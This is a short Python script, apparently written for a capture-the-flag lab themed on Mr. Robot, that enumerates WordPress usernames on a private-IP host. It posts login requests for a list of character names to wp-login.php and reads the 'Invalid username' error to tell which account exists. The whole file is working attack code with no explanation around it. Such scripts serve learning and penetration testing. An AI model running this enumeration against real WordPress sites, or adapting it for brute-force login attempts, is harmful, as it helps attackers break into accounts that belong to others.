#!/usr/bin/python3

import requests

url = "http://10.10.186.224/wp-login.php"

log = "username"
pwd ="password"
wpsubmit = "login"

username_error = "Invalid username"

user_list = ['Elliot Alderson', 'Elliot', 'Alderson', 'Mr. Robot', 'Darlene Alderson', 'Darlene', 'Whiterose', 'Angela Moss', 'Angela', 'Moss'] 

for f in user_list:
	print(f"Trying Username: {f}", end=" - ")
	payload = {"log": f, "pwd":"password", "wp-submit":"login"}
	r = requests.post(url, data=payload)
	if username_error in r.text:
		print("Did not work")
	else:
		print("Got the username!")
		break

print("END OF SCRIPT")